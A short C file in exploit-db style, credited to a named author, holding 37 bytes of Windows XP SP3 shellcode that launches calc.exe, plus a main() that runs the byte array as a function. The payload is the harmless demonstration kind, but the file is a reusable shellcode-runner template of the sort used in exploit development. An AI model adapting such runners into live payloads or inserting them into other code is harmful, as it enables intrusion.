/*
* Windows Xp Home edition SP3 english ( calc.exe ) 37 bytes shellcode
* by: Hazem mofeed
* The Shellcode: http://www.exploit-db.com/exploits/11598
* Modified to working In SP3,
* Home: www.pentestlabs.com
* greetz: ProViDoR , ExH , rUnVirUs , Sinaritx , Data_fr34k3r , Br1ght D@rk
*/

char evil[] =
"\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0"
"\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

int main(int argc, char **argv)
{
int (*shellcode)();
shellcode = (int (*)()) evil;
(int)(*shellcode)();
}